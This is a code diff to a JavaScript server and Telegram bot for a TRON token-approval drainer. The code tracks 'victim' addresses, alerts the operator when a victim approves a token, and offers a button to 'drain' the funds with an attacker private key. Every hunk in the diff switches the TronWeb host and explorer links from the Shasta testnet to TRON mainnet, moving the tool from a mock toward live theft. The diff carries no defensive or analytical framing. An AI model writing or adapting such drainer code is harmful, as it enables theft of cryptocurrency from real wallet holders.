@@ -10,7 +10,7 @@ app.use(express.json());
 
 // Initialize TronWeb for Shasta Testnet
 const tronWeb = new TronWeb({
-  fullHost: 'https://api.shasta.trongrid.io',
+  fullHost: 'https://api.trongrid.io',
   privateKey: process.env.ATTACKER_PRIVATE_KEY
 });
 
@@ -125,7 +125,7 @@ app.post('/api/alert', async (req, res) => {
     `🚨 *APPROVAL DETECTED* 🚨\n\n` +
     `👤 Victim: \`${victimAddress}\`\n` +
     `💰 Current mock balance: **${fmt(bal)} mUSDT**\n` +
-    `🔗 Approve Tx: [view](https://shasta.tronscan.org/#/transaction/${txHash})\n\n` +
+    `🔗 Approve Tx: [view](https://tronscan.org/#/transaction/${txHash})\n\n` +
     `Tap below to inspect, then drain.`;
 
   const keyboard = {
@@ -182,7 +182,7 @@ bot.action(/sweep_(.+)/, async (ctx) => {
     if (info && info.id) {
       const bal = await readBalance(addr).catch(() => 0);
       await ctx.editMessageText(
-        `✅ *DRAINED*\n👤 \`${addr}\`\n💸 Sweep Tx: [view](https://shasta.tronscan.org/#/transaction/${tx})\n💰 Remaining: **${fmt(bal)} mUSDT**`,
+        `✅ *DRAINED*\n👤 \`${addr}\`\n💸 Sweep Tx: [view](https://tronscan.org/#/transaction/${tx})\n💰 Remaining: **${fmt(bal)} mUSDT**`,
         { parse_mode: 'Markdown' }
       );
       const v = victims.find(x => x.address === addr); if (v) v.status = 'DRAINED';
